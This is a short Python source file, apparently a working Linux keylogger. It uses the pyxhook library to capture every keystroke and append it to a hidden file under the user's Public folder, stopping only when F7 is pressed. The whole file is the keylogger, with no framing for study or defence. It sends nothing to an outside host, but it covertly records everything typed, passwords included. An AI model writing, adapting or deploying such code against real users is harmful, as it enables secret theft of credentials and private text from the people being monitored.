import pyxhook
import os

log_file = os.path.join(os.path.expanduser('~'), 'Public', '.fol', 'log')


def kbevent( event ):
	fob=open(log_file,'a')
	if(event.Key == "Return"):
		fob.write("\n")
	elif(event.Key == "space"):
		fob.write(" ")		
	elif(event.Key == "F7"):
		fob.write("<F7>")
		fob.close()
		hookman.cancel()
	elif(event.Ascii < 30):
		fob.write("<" + event.Key + ">")	
	else:
		fob.write(chr(event.Ascii))


hookman = pyxhook.HookManager()
hookman.KeyDown = kbevent
hookman.HookKeyboard()
hookman.start()
    


